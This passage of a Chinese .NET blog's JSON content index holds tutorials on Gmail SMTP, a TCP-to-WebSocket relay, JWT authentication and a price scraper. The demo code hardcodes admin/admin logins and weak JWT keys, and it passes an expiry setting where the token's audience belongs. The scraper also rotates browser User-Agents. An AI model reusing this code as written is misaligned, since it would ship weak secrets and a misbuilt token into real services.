src=&quot;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/20240420aaa11.jpg&quot; &gt;谷歌imap开通 smtp也自动开通 https://myaccount.google.com/​&lt;img onerror=&quot;notfound(this);&quot; src=&quot;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/20240420aaa12.jpg&quot; &gt;​&lt;img onerror=&quot;notfound(this);&quot; src=&quot;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/20240420aaa13.jpg&quot; &gt;接收邮件 (IMAP) 服务器 imap.gmail.com要求 SSL：是端口：993发送邮件 (SMTP) 服务器 smtp.gmail.com要求 SSL：是要求 TLS：是（如适用）使用身份验证：是SSL 端口：465TLS/STARTTLS 端口：587使用谷歌邮箱修改对应的服务器地址、用户名、密码、发件人、收件人、主题、内容等信息即可。``` c#string server = &quot;smtp.gmail.com&quot;;string username = &quot;f@gmail.com&quot;;string password = &quot;xx&quot;;string from = &quot;f@gmail.com&quot;;string to = &quot;t@qq.com&quot;;string subject = &quot;TestSMTPEmail m&quot;;string content = &quot;This is a test email sent using Gmail SMTP.m&quot;;bool isHtml = false; // 是否为 HTML 格式 运行： ​​ 📮有些免费邮箱对发信量有限制，可使用企业邮，多账号增加发信量。 END","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".NET","slug":"NET","permalink":"https://banjinmei.github.io/tags/NET/"}],"author":"mu"},{"title":"Socket to WebSocket","slug":"NET-Socket","date":"2024-04-20T04:56:50.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/04/20/NET-Socket/","permalink":"https://banjinmei.github.io/2024/04/20/NET-Socket/","excerpt":"","text":"前言针对IOS App Proxy Server无法直连WebSocket，建立 Socket中转端。 ​ WebSocket 端： WebSocket 端用于实现实时通信功能。 WebSocket 端通过 WebSocket 协议与中转端通信，中转端可以通过 WebSocket 或其他传输协议与 WebSocket 端建立连接，收发消息。 定义 SendMessageToChatRoomIP 和 JoinChatRoom，用于处理来自客户端的消息和连接事件。 中转端 C1 （Socket Server）： 中转端 C1 是一个独立的应用程序，用于连接WebSocket端，建立Socket服务。 中转端 C1 的主要功能是接收来自客户端 C2 的消息，并将其转发给 WebSocket 端，或者接收来自 WebSocket 端的消息，并转发给客户端 C2。 客户端 C2 x N ： 客户端 C2 ，主要与中转端连接 发送数据，接收数据。 在客户端 C2 中，连接到中转端 C1、发送消息给中转端 C1、接收来自中转端 C1 的消息。 调用关系为： 客户端 C2 通过与中转端 C1 的通信，向 WebSocket 端发送消息或接收来自 WebSocket 端的消息。 中转端 C1 接收来自客户端 C2 的消息，并将其转发给 WebSocket 端，或者接收来自 WebSocket 端的消息，并转发给客户端 C2。 ​ 中转端实现1.连接WebSocket1234567891011121314151617181920212223public async Task ConnectToServer()&#123; try &#123; connection = new HubConnectionBuilder() .WithUrl(&quot;xxx/chathub&quot;)// .Build(); connection.On&lt;string, string, string, string&gt;(&quot;ReceiveMessage&quot;, async (user, message, clientIP, chatRoomId) =&gt; &#123; Console.WriteLine($&quot;Received message from wsserver_sr : &#123;user&#125;: &#123;message&#125; |socketserver &#123;clientIP&#125;|&#123;chatRoomId&#125;&quot;); // 收到来自服务器的消息时，向客户端 C2 发送消息 await SendMessageToClientC2(user, message, clientIP, chatRoomId); &#125;); await connection.StartAsync(); &#125; catch (Exception ex) &#123; Console.WriteLine($&quot;Error connecting to SignalR server: &#123;ex.Message&#125;&quot; + Environment.NewLine); &#125;&#125; 收到消息时发送给对应客户端 12345678910111213141516public async Task SendMessageToClientC2(string user, string message, string clientIP, string chatRoomId)&#123; // 根据 chatRoomId 找到对应的客户端 C2，并发送消息 if (chatRooms.ContainsKey(chatRoomId)) &#123; byte[] data = Encoding.ASCII.GetBytes($&quot;&#123;user&#125; &#123;message&#125; |&#123;clientIP&#125;|&#123;chatRoomId&#125; &quot;); foreach (var client in chatRooms[chatRoomId]) &#123; await client.GetStream().WriteAsync(data, 0, data.Length); &#125; &#125; else &#123; Console.WriteLine($&quot;Chat room &#123;chatRoomId&#125; does not exist&quot; + Environment.NewLine); &#125;&#125; 2.建立中转端Socket端口1234567891011121314151617181920public void StartListening()&#123; if (!listening) &#123; try &#123; int port = 10086; // 监听端口 server = new TcpListener(IPAddress.Any, port); server.Start(); listening = true; Console.WriteLine($&quot;Server listening on port &#123;port&#125;&quot; + Environment.NewLine); Task.Run(() =&gt; AcceptClients()); &#125; catch (Exception ex) &#123; Console.WriteLine($&quot;Error starting server: &#123;ex.Message&#125;&quot; + Environment.NewLine); &#125; &#125;&#125; 3.向客户端发消息 123456789101112131415public async Task AcceptClients()&#123; while (listening) &#123; try &#123; TcpClient client = await server.AcceptTcpClientAsync(); Task.Run(() =&gt; HandleClient(client)); &#125; catch (Exception ex) &#123; Console.WriteLine($&quot;Error accepting client: &#123;ex.Message&#125;&quot; + Environment.NewLine); &#125; &#125;&#125; 4.监听客户端连接123456789101112131415public async Task AcceptClients()&#123; while (listening) &#123; try &#123; TcpClient client = await server.AcceptTcpClientAsync(); Task.Run(() =&gt; HandleClient(client)); &#125; catch (Exception ex) &#123; Console.WriteLine($&quot;Error accepting client: &#123;ex.Message&#125;&quot; + Environment.NewLine); &#125; &#125;&#125; 5.处理客户端连接1234567891011121314151617181920212223242526272829303132public async Task HandleClient(TcpClient client)&#123; NetworkStream stream = client.GetStream(); byte[] buffer = new byte[1024]; int bytesRead; while (client.Connected) &#123; try &#123; bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length); string message = Encoding.ASCII.GetString(buffer, 0, bytesRead); ProcessMessage(message, client); &#125; catch (Exception ex) &#123; Console.WriteLine($&quot;Error receiving message: &#123;ex.Message&#125;&quot; + Environment.NewLine); break; &#125; &#125; // 客户端断开连接时，从聊天室中移除 foreach (var chatRoomId in chatRooms.Keys) &#123; if (chatRooms[chatRoomId].Contains(client)) &#123; chatRooms[chatRoomId].Remove(client); Console.WriteLine($&quot;Client disconnected from chat room &#123;chatRoomId&#125;&quot; + Environment.NewLine); break; &#125; &#125;&#125; 6.处理连接12345678910111213141516171819202122232425262728public async void ProcessMessage(string message, TcpClient client)&#123; string[] parts = message.Split(&#x27;|&#x27;); if (parts.Length &gt;= 2) &#123; string command = parts[0]; string chatRoomId = parts[1]; switch (command) &#123; case &quot;JoinChatRoom&quot;: await JoinChatRoom(chatRoomId, client); break; case &quot;SendMessageToChatRoomIP2&quot;: if (parts.Length &gt;= 4) &#123; string user = parts[2]; string msg = parts[3]; // await SendMessageToChatRoom(chatRoomId, user, msg); await SendMessageToChatRoomAddress(chatRoomId, user, msg, client); &#125; break; default: Console.WriteLine($&quot;Invalid command: &#123;command&#125;&quot; + Environment.NewLine); break; &#125; &#125;&#125; JoinChatRoom 异步调用服务端的JoinChatRoom SendMessageToChatRoomIP2 异步调用SendMessage 7.运行本地运行​ 发布到linux​ run Server listening on port 10860 1netstat -tln查看端口 （tuln） 也可以优化封装成WinForm程序，收发消息可视化。 点击启动socket端口调用 1.连接websocket 2.监听socket ​ 也可以封装成系统服务，与进程一样藏在后台运行。 客户端实现1.连接Socket端12345678910111213141516171819private async void MainForm_Load(object sender, EventArgs e)&#123; try &#123; client = new TcpClient(); await client.ConnectAsync(&quot;192.168.80.123&quot;, 10086); stream = client.GetStream(); connected = true; // 连接成功后，调用 JoinChatRoom 方法加入聊天室 await JoinChatRoom(&quot;room001&quot;); Task.Run(ReceiveMessages); &#125; catch (Exception ex) &#123; textBoxReceivedMessages.AppendText($&quot;Error connecting to server: &#123;ex.Message&#125;&quot; + Environment.NewLine); &#125;&#125; 2.加入ChatRoomJoinChatRoom中转到Server端再加入聊天室 123456private async Task JoinChatRoom(string chatRoomId) &#123; // 发送消息给中转端 C1，请求加入聊天室 byte[] data = Encoding.ASCII.GetBytes($&quot;JoinChatRoom|&#123;chatRoomId&#125;|J&quot;); await stream.WriteAsync(data, 0, data.Length); &#125; 3.发送消息发送到Socket中转端 123456private async Task SendMessageToChatRoom(string chatRoomId, string message)&#123; // 发送消息给中转端 C1，请求向指定聊天室发送消息 byte[] data = Encoding.ASCII.GetBytes($&quot;SendMessageToChatRoomIP2|&#123;chatRoomId&#125;|client2m|&#123;message&#125;&quot;); await stream.WriteAsync(data, 0, data.Length);&#125; 4.接收消息123456789101112131415161718192021222324252627282930private async Task ReceiveMessages() &#123; byte[] buffer = new byte[1024]; int bytesRead; while (connected) &#123; try &#123; bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length); string message = Encoding.ASCII.GetString(buffer, 0, bytesRead); DisplayMessage(message); &#125; catch (Exception ex) &#123; textBoxReceivedMessages.AppendText($&quot;Error receiving message: &#123;ex.Message&#125;&quot; + Environment.NewLine); &#125; &#125; &#125; private void DisplayMessage(string message) &#123; if (InvokeRequired) &#123; Invoke(new Action&lt;string&gt;(DisplayMessage), message); return; &#125; textBoxReceivedMessages.AppendText(message + Environment.NewLine); &#125; 5.点击事件Send 12345678910111213141516171819202122private async void buttonSend_Click(object sender, EventArgs e) &#123; if (!connected) &#123; textBoxReceivedMessages.AppendText(&quot;Not connected to server.&quot; + Environment.NewLine); return; &#125; string message = textBoxSendMessage.Text; if (!string.IsNullOrEmpty(message)) &#123; // 发送消息给中转端 C1，请求向聊天室发送消息 await SendMessageToChatRoom(&quot;room001&quot;, message); textBoxSendMessage.Clear(); textBoxReceivedMessages.AppendText(&quot;Sent message to chat room: room001&quot; + Environment.NewLine); &#125; else &#123; textBoxReceivedMessages.AppendText(&quot;Please enter a message.&quot; + Environment.NewLine); &#125; &#125; 6.运行​ 服务端启动 Server listening on port 10086 服务端发收发消息到中转端 Sent message to chat room: room001client2m hihihi|socketclient 192.168.80.123 |::ffff:183.7.113.105|room001 中转端拿到客户端信息-&gt;WebSocket端-&gt;中转端接收-&gt;客户端接收 Client joined chat room room001Received message from WSSserver_sr : client2m: hihihi|socketclient 192.168.80.123 |socketserver:::ffff:183.7.113.105|room001 客户端也可以用IOS SOCKET5发送消息 //... dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^&#123; NSData * sendData = [@&quot;JoinChatRoom|room001&quot; dataUsingEncoding:NSUTF8StringEncoding]; [self.socket writeData:sendData withTimeout:-1 tag:1]; dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^&#123; NSData * sendData = [@&quot;SendMessageToChatRoomIP2|room001|userid001|hello&quot; dataUsingEncoding:NSUTF8StringEncoding]; [self.socket writeData:sendData withTimeout:-1 tag:2]; [self.socket readDataWithTimeout:-1 tag:1]; &#125;); &#125;); //... Run ​","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[],"author":"mu"},{"title":".NET JWT ","slug":"NET-JWT","date":"2024-04-18T17:26:35.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/04/19/NET-JWT/","permalink":"https://banjinmei.github.io/2024/04/19/NET-JWT/","excerpt":"","text":"前言 JWT (JSON Web Token) 是一种安全传输信息的开放标准，由Header、Payload和Signature三部分组成。它主要用于身份验证、信息交换和授权。JWT可验证用户身份，确保访问权限，实现单点登录，并在客户端和服务器之间安全地交换信息。因其简单、安全和便捷，JWT在现代Web应用中广泛使用。 用JWT有多个原因： 无状态的身份验证：JWT允许服务器无需保存用户的会话信息，因为所有必要的信息都存储在令牌本身中。这降低了服务器的存储需求，并提高了系统的可扩展性。 跨域身份验证：由于JWT是自我包含的，并且可以被轻松传递，因此它非常适合跨域身份验证。用户可以在一个服务上验证身份，然后使用相同的令牌访问另一个服务，从而实现单点登录（SSO）。 安全性：JWT可以通过使用强大的加密算法（如HS256, RS256等）进行签名，以确保其完整性和真实性。服务器可以使用公钥验证令牌的签名，从而确保它没有被篡改，并且确实是由受信任的颁发者签发的。 减少数据库查询：由于用户的身份信息都存储在JWT中，服务器无需每次都去数据库中查询用户的身份信息，从而减少了数据库的压力和查询时间。 可定制性：JWT的Payload部分可以包含自定义的信息，如用户角色、权限等，这使得JWT非常灵活，并可以根据具体需求进行定制。 易于分发和共享：JWT可以轻松地通过网络传输，并且可以在多个服务和客户端之间共享，这使得它在微服务架构和分布式系统中非常有用。 标准化和互操作性：JWT是一个开放标准（RFC 7519），这意味着不同的系统和语言都可以使用相同的方式生成和验证JWT，从而提高了系统的互操作性。 环境 Win10 VS2022 .NET8 ✨ 建立项目jwttest1.创建TestJwtController​ 2.下载JWT​ 3.建实体类123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051/// &lt;summary&gt;/// 用户信息类/// &lt;/summary&gt;public class LoginRs&#123; /// &lt;summary&gt; /// 用户ID /// &lt;/summary&gt; public string UserId &#123; get; set; &#125; /// &lt;summary&gt; /// 用户密码 /// &lt;/summary&gt; public string PasswordMD5 &#123; get; set; &#125;&#125;/// &lt;summary&gt;/// 用户登录信息类/// &lt;/summary&gt;public class LoginInfo&#123; /// &lt;summary&gt; /// 用户信息 /// &lt;/summary&gt; public string UserId &#123; get; set; &#125; /// &lt;summary&gt; /// 检验时间 /// &lt;/summary&gt; public DateTime Expires &#123; get; set; &#125;&#125;/// &lt;summary&gt;/// rsmodel/// &lt;/summary&gt;public class RsModel&#123; /// &lt;summary&gt; /// 是否成功 /// &lt;/summary&gt; public bool isOk &#123; get; set; &#125; /// &lt;summary&gt; /// 返回值 /// &lt;/summary&gt; public int code &#123; get; set; &#125; /// &lt;summary&gt; /// 返回消息 /// &lt;/summary&gt; public string msg &#123; get; set; &#125; /// &lt;summary&gt; /// 返回数据 /// &lt;/summary&gt; public object rsData &#123; get; set; &#125; &#125; 4.添加post login12345678910111213141516171819202122232425262728// POST api/&lt;ValuesController&gt;[HttpPost]public string Login([FromBody] LoginRs loginRequest)&#123; if (loginRequest == null) return JsonConvert.SerializeObject(new RsModel() &#123; code = 0, isOk = false, msg = &quot;登录信息为空！&quot; &#125;); #region 判断userid pwd if (loginRequest.UserId != &quot;admin&quot; || loginRequest.PasswordMD5 != &quot;admin&quot;) &#123; return JsonConvert.SerializeObject(new RsModel() &#123; code = 0, isOk = false, msg = &quot;用户名和密码不正确！&quot; &#125;); &#125; #endregion LoginInfo Info = new LoginInfo() &#123; UserId = loginRequest.UserId, Expires = DateTime.Now.AddDays(1) &#125;; const string secretKey = &quot;myseckey&quot;;//口令加密秘钥 byte[] key = Encoding.UTF8.GetBytes(secretKey); IJwtAlgorithm algorithm = new HMACSHA256Algorithm();//加密方式 IJsonSerializer serializer = new JsonNetSerializer();//序列化Json IBase64UrlEncoder urlEncoder = new JwtBase64UrlEncoder();//base64加解密 IJwtEncoder encoder = new JwtEncoder(algorithm, serializer, urlEncoder);//JWT编码 var token = encoder.Encode(Info, key);//生成令牌 return JsonConvert.SerializeObject(new RsModel() &#123; code = 1, isOk = true, rsData = token, msg = &quot;登录成功！&quot; &#125;);&#125; ​ 5.登录验证这里使用swagger方便检验 👉 .NET MVC API Swagger入坑 ​ 6.测试没问题，写个JwtHelper12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667public static class JwtHelper&#123; private static readonly string JwtKey = &quot;mysecret&quot;; /// &lt;summary&gt; /// 获取加密解密 /// &lt;/summary&gt; /// &lt;returns&gt;&lt;/returns&gt; private static IJwtEncoder GetEncoder() &#123; IJwtAlgorithm algorithm = new HMACSHA256Algorithm();//加密方式 IJsonSerializer serializer = new JsonNetSerializer();//序列化Json IBase64UrlEncoder urlEncoder = new JwtBase64UrlEncoder();//base64加解密 IJwtEncoder encoder = new JwtEncoder(algorithm, serializer, urlEncoder);//JWT编码 return encoder; &#125; /// &lt;summary&gt; /// 获取解密密钥 /// &lt;/summary&gt; /// &lt;returns&gt;&lt;/returns&gt; private static IJwtDecoder GetDecoder() &#123; IJsonSerializer serializer = new JsonNetSerializer(); IDateTimeProvider provider = new UtcDateTimeProvider(); IJwtValidator validator = new JwtValidator(serializer, provider); IBase64UrlEncoder urlEncoder = new JwtBase64UrlEncoder(); IJwtAlgorithm algorithm = new HMACSHA256Algorithm(); IJwtDecoder decoder = new JwtDecoder(serializer, validator, urlEncoder, algorithm); return decoder; &#125; /// &lt;summary&gt; /// 加密 /// &lt;/summary&gt; public static string Encode(object payload) &#123; var encoder = GetEncoder(); var token = encoder.Encode(payload, JwtKey); return token; &#125; /// &lt;summary&gt; /// 解密 /// &lt;/summary&gt; public static T Decode&lt;T&gt;(string token) &#123; var decoder = GetDecoder(); var data = decoder.Decode(token, JwtKey); var res = JsonConvert.DeserializeObject&lt;T&gt;(data); return res; &#125; /// &lt;summary&gt; /// 解密，只返回Json文本 /// &lt;/summary&gt; /// &lt;param name=&quot;token&quot;&gt;&lt;/param&gt; /// &lt;returns&gt;&lt;/returns&gt; public static string Decode(string token) &#123; var decoder = GetDecoder(); var data = decoder.Decode(token, JwtKey); return data; &#125;&#125; ​把中间的加密算法替换成helper的Encode 1var token = JwtHelper.Encode(Info); 7.添加token加密类​ 调用Decode方法 解密token 8.测试JWT​ 1&#123;&quot;isOk&quot;:true,&quot;code&quot;:1,&quot;msg&quot;:&quot;登录成功！&quot;,&quot;rsData&quot;:&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJVc2VySWQiOiJhZG1pbiIsIkV4cGlyZXMiOiIyMDI0LTA0LTEwVDAxOjUxOjUwLjk5NDgxNzQrMDA6MDAifQ.eYJovquJFezVhfdLp-Hro2vnMoQsUwgXLkYcZSYEy7U&quot;&#125; 测试解密 ​ 解密成功 ⭐️JwtBearer9、添加NuGet包Microsoft.AspNetCore.Authentication.JwtBearer​ 10、在appsettings.json中添加JWT配置节点12345&quot;JWT&quot;: &#123; &quot;SecKey&quot;: &quot;im6666666!#@$%@%^^&amp;*(~Czmjklneafguvioszb%yuv&amp;*6WVDf5dw#5dfw6f5w6faW%FW^f5wa65f^AWf56&quot;, //密钥 &quot;Issuer&quot;: &quot;im666&quot;, //发行者 &quot;ExpireSeconds&quot;: 7200 //过期时间 2h&#125;, 11.添加jwt类 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121 using Microsoft.IdentityModel.Tokens; using System.Diagnostics; using System.IdentityModel.Tokens.Jwt; using System.Security.Claims; using System.Text; namespace webapijwttest.Models&#123; /// &lt;summary&gt; /// 授权JWT类 /// &lt;/summary&gt; public class JwtHelper2 &#123; private readonly IConfiguration _configuration; /// &lt;summary&gt; /// Token配置 /// &lt;/summary&gt; /// &lt;param name=&quot;configuration&quot;&gt;&lt;/param&gt; public JwtHelper2(IConfiguration configuration) &#123; _configuration = configuration; &#125; /// &lt;summary&gt; /// 创建Token 这里面可以保存自己想要的信息 /// &lt;/summary&gt; /// &lt;param name=&quot;username&quot;&gt;&lt;/param&gt; /// &lt;param name=&quot;mobile&quot;&gt;&lt;/param&gt; /// &lt;returns&gt;&lt;/returns&gt; public string CreateToken(string username, string mobile) &#123; try &#123; // 1. 定义需要使用到的Claims var claims = new[] &#123; new Claim(&quot;username&quot;, username), new Claim(&quot;mobile&quot;, mobile), /* 可以保存自己想要信息，传参进来即可 new Claim(&quot;sex&quot;, &quot;sex&quot;), new Claim(&quot;limit&quot;, &quot;limit&quot;), new Claim(&quot;head_url&quot;, &quot;xxxxx&quot;) */ &#125;; // 2. 从 appsettings.json 中读取SecretKey var secretKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(_configuration[&quot;Jwt:SecKey&quot;])); // 3. 选择加密算法 var algorithm = SecurityAlgorithms.HmacSha256; // 4. 生成Credentials var signingCredentials = new SigningCredentials(secretKey, algorithm); // 5. 根据以上，生成token var jwtSecurityToken = new JwtSecurityToken( _configuration[&quot;Jwt:Issuer&quot;], //Issuer _configuration[&quot;Jwt:ExpireSeconds&quot;], //ExpireSeconds claims, //Claims, DateTime.Now, //notBefore DateTime.Now.AddSeconds(30), //expires signingCredentials //Credentials ); // 6. 将token变为string var token = new JwtSecurityTokenHandler().WriteToken(jwtSecurityToken); return token; &#125; catch (Exception) &#123; throw; &#125; &#125; /// &lt;summary&gt; /// 获取信息 /// &lt;/summary&gt; /// &lt;param name=&quot;jwt&quot;&gt;&lt;/param&gt; /// &lt;returns&gt;&lt;/returns&gt; public static string ReaderToken(string jwt) &#123; var str = string.Empty; try &#123; //获取Token的三种方式 //第一种直接用JwtSecurityTokenHandler提供的read方法 var jwtHander = new JwtSecurityTokenHandler(); JwtSecurityToken jwtSecurityToken = jwtHander.ReadJwtToken(jwt); str = jwtSecurityToken.ToString(); &#125; catch (Exception ex) &#123; Debug.WriteLine(ex.Message); &#125; return str; &#125; /// &lt;summary&gt; /// 解密jwt /// &lt;/summary&gt; /// &lt;param name=&quot;jwt&quot;&gt;&lt;/param&gt; /// &lt;returns&gt;&lt;/returns&gt; public string JwtDecrypt(string jwt) &#123; StringBuilder sb = new StringBuilder(); try &#123; JwtSecurityTokenHandler tokenHandler = new(); TokenValidationParameters valParam = new(); var securityKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(_configuration[&quot;Jwt:SecKey&quot;])); valParam.IssuerSigningKey = securityKey; valParam.ValidateIssuer = false; valParam.ValidateAudience = false; //解密 ClaimsPrincipal claimsPrincipal = tokenHandler.ValidateToken(jwt, valParam, out SecurityToken secToken); foreach (var claim in claimsPrincipal.Claims) &#123; sb.Append($&quot;&#123;claim.Type&#125;=&#123;claim.Value&#125;&quot;); &#125; &#125; catch (Exception ex) &#123; Debug.WriteLine(ex.Message); &#125; return sb.ToString(); &#125; &#125;&#125; 12.Program.cs注册JWT服务1234567891011121314151617181920#region JWT服务// 注册JWT服务builder.Services.AddSingleton(new JwtHelper2(builder.Configuration));builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme).AddJwtBearer(options =&gt;&#123; options.TokenValidationParameters = new TokenValidationParameters() &#123; ValidateIssuer = true, //是否验证Issuer ValidIssuer = builder.Configuration[&quot;Jwt:Issuer&quot;], //发行人Issuer ValidateAudience = false, //是否验证Audience ValidateIssuerSigningKey = true, //是否验证SecurityKey IssuerSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(builder.Configuration[&quot;Jwt:SecKey&quot;])), //SecurityKey ValidateLifetime = true, //是否验证失效时间 ClockSkew = TimeSpan.FromSeconds(30), //过期时间容错值，解决服务器端时间不同步问题（秒） RequireExpirationTime = true, &#125;;&#125;);#endregion 添加swagger authorization 12345678910111213141516171819202122232425262728293031builder.Services.AddSwaggerGen(c =&gt;&#123; c.SwaggerDoc(&quot;v1&quot;, new OpenApiInfo &#123; Title = &quot;Web API&quot;, Version = &quot;v1&quot; &#125;); //开启注释 var xmlFile = $&quot;&#123;Assembly.GetEntryAssembly().GetName().Name&#125;.xml&quot;; var xmlPath = Path.Combine(AppContext.BaseDirectory, xmlFile);//需要 生成 目录生成XML c.IncludeXmlComments(xmlPath, true); // 配置 JWT Bearer 授权 c.AddSecurityDefinition(&quot;Bearer&quot;, new OpenApiSecurityScheme &#123; Description = &quot;JWT Authorization header using the Bearer scheme&quot;, Name = &quot;Authorization&quot;, In = ParameterLocation.Header, Type = SecuritySchemeType.Http, Scheme = &quot;bearer&quot; &#125;); var securityScheme = new OpenApiSecurityScheme &#123; Reference = new OpenApiReference &#123; Type = ReferenceType.SecurityScheme, Id = &quot;Bearer&quot; &#125; &#125;; var securityRequirement = new OpenApiSecurityRequirement &#123; &#123; securityScheme, new string[] &#123; &#125; &#125; &#125;; c.AddSecurityRequirement(securityRequirement); &#125;); var app = builder.Build(); //启用验证中间件app.UseAuthentication();app.UseAuthorization(); 13.添加jwt测试api12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758using Microsoft.AspNetCore.Authorization;using Microsoft.AspNetCore.Identity.Data;using Microsoft.AspNetCore.Mvc;using webapijwttest.Models;namespace webapijwttest.Controllers&#123; [Route(&quot;api/[controller]/[action]&quot;)] [ApiController] public class Jwt2Controller : ControllerBase &#123; private readonly JwtHelper2 _jwt; /// &lt;summary&gt; /// 初始化 /// &lt;/summary&gt; /// &lt;param name=&quot;jwtHelper&quot;&gt;&lt;/param&gt; public Jwt2Controller(JwtHelper2 jwtHelper) &#123; _jwt = jwtHelper; &#125; /// &lt;summary&gt; /// 获取Token /// &lt;/summary&gt; /// &lt;returns&gt;&lt;/returns&gt; [HttpPost] public IActionResult GetToken(LoginRs user) &#123; //参数验证等等.... if (string.IsNullOrEmpty(user.UserId)) &#123; return Ok(&quot;参数异常！&quot;); &#125; //这里可以连接mysql数据库做账号密码验证 //这里可以做Redis缓存验证等等 //这里获取Token，当然，这里也可以选择传结构体过去 var token = _jwt.CreateToken(user.UserId, user.PasswordMD5); //解密后的Token var PWToken = _jwt.JwtDecrypt(token); return Ok(token + &quot;解密后：&quot; + PWToken); &#125; /// &lt;summary&gt; /// 获取自己的详细信息，其中 [Authorize] 就表示要带Token才行 /// &lt;/summary&gt; /// &lt;returns&gt;&lt;/returns&gt; [HttpPost] [Authorize] public IActionResult GetSelfInfo() &#123; //执行到这里，就表示已经验证授权通过了 /* * 这里返回个人信息有两种方式 * 第一种：从Header中的Token信息反向解析出用户账号，再从数据库中查找返回 * 第二种：从Header中的Token信息反向解析出用户账号信息直接返回，当然，在前面创建 Token时，要保存进使用到的Claims中。 */ return Ok(&quot;授权通过了！&quot;); &#125; &#125;&#125; 调用 ​ 检测控制器 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657using Microsoft.AspNetCore.Authorization;using Microsoft.AspNetCore.Mvc;using Newtonsoft.Json;using webapijwttest.Models; // For more information on enabling Web API for empty projects, visit https://go.microsoft.com/fwlink/?LinkID=397860 namespace webapijwttest.Controllers&#123; [Route(&quot;api/[controller]&quot;)] [ApiController] public class AuthController : ControllerBase &#123; private ILogger&lt;AuthController&gt; _logger = null; private JwtHelper2 _iJWTService = null; private readonly IConfiguration _configuration; public AuthController(ILogger&lt;AuthController&gt; logger, JwtHelper2 jWTService, IConfiguration configuration) &#123; this._logger = logger; _iJWTService = jWTService; _configuration = configuration; &#125; [Route(&quot;Get&quot;)] [HttpGet] public IEnumerable&lt;int&gt; Get() &#123;//未加授权认证 return new List&lt;int&gt;() &#123; 1, 3, 5, 7, 9 &#125;; &#125; [Route(&quot;GetData&quot;)] [HttpGet] [Authorize] public List&lt;object&gt; GetData() &#123;//添加了授权认证，需要使用token return new List&lt;object&gt;() &#123; new &#123; userName = &quot;123&quot;, remark = &quot;1234&quot; &#125; &#125;; &#125; [Route(&quot;Login&quot;)] [HttpGet] public string Login(string name, string password) &#123; if (!string.IsNullOrEmpty(name) &amp;&amp; !string.IsNullOrEmpty(password)) &#123; string token = this._iJWTService.CreateToken(name,password); return JsonConvert.SerializeObject(new &#123; result = true, token &#125;); &#125; else &#123; return JsonConvert.SerializeObject(new &#123; result = false, token = &quot;&quot; &#125;); &#125; &#125; &#125;&#125; 调用​ 把token放进 ​ 测试GetData​ 当超过时间调用则GetData失败​ END🐟🐟🐟","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"JWT","slug":"JWT","permalink":"https://banjinmei.github.io/tags/JWT/"}],"author":"mu"},{"title":".NET spider","slug":"NET-Spider","date":"2024-04-18T04:59:30.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/04/18/NET-Spider/","permalink":"https://banjinmei.github.io/2024/04/18/NET-Spider/","excerpt":"","text":"前言爬虫可以用于外汇，期货，基金，货币，比分，电商，文章等信息的采集。通过数据分析，竞品分析，为商业决策提供数据支持。 ​金价暴涨，抓取下今日的金价。 💡使用HttpClient爬取数据1234567891011121314151617181920try&#123; // 创建HttpClient实例 using (var httpClient = new HttpClient()) &#123; //模拟User-Agent httpClient.DefaultRequestHeaders.Add(&quot;User-Agent&quot;, GetUserAgent()); // 发送GET请求并获取响应 xxx.com是某网站的页面~（保护） var response = await httpClient.GetAsync(&quot;https://xxx.com&quot;); response.EnsureSuccessStatusCode(); var htmlContent = await response.Content.ReadAsStringAsync(); &#125;&#125;catch (HttpRequestException ex)&#123; // 处理请求异常 ViewBag.Error = &quot;Failed to retrieve price data: &quot; + ex.Message;&#125; 🚀模拟User-Agent1234567891011121314// 生成随机 User-Agentprivate string GetUserAgent()&#123; string[] userAgents = new string[] &#123; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36&quot;, // &#125;; Random random = new Random(); int index = random.Next(userAgents.Length); return userAgents[index];&#125; 🤵使用HTML解析库（HtmlAgilityPack）提取价格 ​ 123456789101112131415161718192021222324252627282930// 使用HtmlAgilityPack解析HTML var htmlDocument = new HtmlDocument(); htmlDocument.LoadHtml(htmlContent); // 使用XPath表达式选择指定的&lt;tr&gt;元素 var trElement = htmlDocument.DocumentNode.SelectSingleNode(&quot;//tr[contains(@class, &#x27;border_ea&#x27;) and contains(@class, &#x27;noTop_border&#x27;)]&quot;); if (trElement != null) &#123; // 获取包含价格的&lt;td&gt;元素 var priceCell = trElement.SelectSingleNode(&quot;.//td[@align=&#x27;center&#x27;][2]&quot;); if (priceCell != null) &#123; // 提取价格 string price = priceCell.InnerText.Trim(); // 将价格传递给视图 ViewBag.Price = price; &#125; else 